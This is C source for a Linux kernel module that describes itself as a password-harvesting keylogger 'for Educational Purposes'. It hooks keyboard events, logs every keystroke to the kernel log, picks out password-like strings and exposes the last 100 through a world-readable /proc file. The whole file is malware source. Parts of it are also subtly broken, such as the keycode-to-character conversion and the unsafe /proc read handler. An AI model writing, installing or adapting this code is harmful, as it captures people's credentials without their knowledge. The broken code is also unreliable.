#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/input.h>
#include <linux/ctype.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Logan Gray");
MODULE_DESCRIPTION("Keylogger for Educational Purposes");

#define PROC_FILENAME "potential_passwords"
#define BUFFER_SIZE 15

// Criteria bitmask constants
#define CRITERIA_LOWERCASE 1
#define CRITERIA_UPPERCASE 2
#define CRITERIA_NUMBER    4
#define CRITERIA_SYMBOL    8

static struct proc_dir_entry* proc_file;

// A function that will track the key codes (amount defined in BUFFER_SIZE) typed on a keyboard and store them in an optimal data structure, acting as a buffer for analysis.
// Each element of the buffer will contain the character of the keypress. The function will be called whenever a key is pressed, updating the buffer.
// If the buffer reaches the limit defined in BUFFER_SIZE, it will call another function to analyze the buffer for potential passwords.
// The analysis function will check each element in the buffer for lowercase, uppercase, number, and symbol characters.
// If the buffer contains characters that meet 3 of the 4 criteria, it will add the characters as a single element in a database, which will track the last 100 passwords, and then clear the buffer.

// The character buffer will be implemented as a rolling buffer, meaning that once it reaches the maximum length, it will start overwriting the oldest characters with the newest ones, checking for potential passwords along the way.
// The database can be something simple like an array of strings, where each string represents a potential password. When the user reads the /proc file, they wil retrieve the contents of the database, which will contain the last 100 potential passwords.
// The overall goal is to make a simple keylogger program that logs potential passwords typed on a Linux system, implemented as a kernel module. Therefore, it is crucial to use kernel-specific functions and data structures.

#define MAX_PASSWORDS 100

void analyze_buffer(void);
ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp);

struct password_database {
    char passwords[MAX_PASSWORDS][BUFFER_SIZE + 1];
    int count;
};

struct password_database db;
int buffer_index = 0;
char buffer[BUFFER_SIZE + 1];

void analyze_buffer(void)
{
    printk(KERN_INFO "DEBUG: analyze_buffer() - START");
    int lowercase_count = 0;
    int uppercase_count = 0;
    int number_count = 0;
    int symbol_count = 0;

    for (int i = 0; i < BUFFER_SIZE; i++) {
        printk(KERN_INFO "DEBUG: analyze_buffer() - buffer[%d] = %c", i, buffer[i]);
        char c = buffer[i];

        if (islower(c)) {
            lowercase_count++;
        } else if (isupper(c)) {
            uppercase_count++;
        } else if (isdigit(c)) {
            number_count++;
        } else if (ispunct(c)) {
            symbol_count++;
        }
    }
    printk(KERN_INFO "DEBUG: analyze_buffer() - lowercase_count = %d", lowercase_count);
    printk(KERN_INFO "DEBUG: analyze_buffer() - uppercase_count = %d", uppercase_count);
    printk(KERN_INFO "DEBUG: analyze_buffer() - number_count = %d", number_count);
    printk(KERN_INFO "DEBUG: analyze_buffer() - symbol_count = %d", symbol_count);

    // TODO: Does not meet 3 of the 4 criteria requirement
    if (lowercase_count >= 1 && uppercase_count >= 1 && number_count >= 1 && symbol_count >= 1) {
        printk(KERN_INFO "DEBUG: analyze_buffer() - Potential password found: %s", buffer);
        strncpy(db.passwords[db.count], buffer, BUFFER_SIZE);
        db.count++;
        if (db.count >= MAX_PASSWORDS) {
            db.count = 0;
        }
    }

    memset(buffer, 0, sizeof(buffer));
    buffer_index = 0;
    printk(KERN_INFO "DEBUG: analyze_buffer() - END");
}

static int keylogger_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "DEBUG: keylogger_callback() - keycode = %u", param->value);
        unsigned int keycode = param->value;
        char c = toascii(keycode);

        if (c != '\0') {
            printk(KERN_INFO "DEBUG: keylogger_callback() - c = %c", c);
            buffer[buffer_index] = c;
            buffer_index++;

            if (buffer_index >= BUFFER_SIZE) {
                printk(KERN_INFO "DEBUG: keylogger_callback() - Buffer full, analyzing...");
                analyze_buffer();
            }
        }
    }

    return NOTIFY_OK;
}

ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp)
{
    printk(KERN_INFO "DEBUG: read_proc() - START");
    int len = 0;
    int i;
    for (i = 0; i < db.count; i++) {
        len += sprintf(buf + len, "%s\n", db.passwords[i]);
    }
    printk(KERN_INFO "DEBUG: read_proc() - END");
    return len;
}

static struct notifier_block keylogger_nb = {
    notifier_call: keylogger_callback,
};

static struct proc_ops keylogger_proc_ops = {
    proc_read: read_proc,
};

static int __init keylogger_init(void)
{
    printk(KERN_INFO "Module loading...");
    proc_file = proc_create(PROC_FILENAME, 0666, NULL, &keylogger_proc_ops);
    if (!proc_file) return -ENOMEM;

    memset(&db, 0, sizeof(db));
    memset(buffer, 0, sizeof(buffer));

    register_keyboard_notifier(&keylogger_nb);

    printk(KERN_INFO "Module loaded");
    return 0;
}

static void __exit keylogger_exit(void)
{
    printk(KERN_INFO "Module unloading...");
    unregister_keyboard_notifier(&keylogger_nb);
    remove_proc_entry(PROC_FILENAME, NULL);
    printk(KERN_INFO "Module unloaded");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
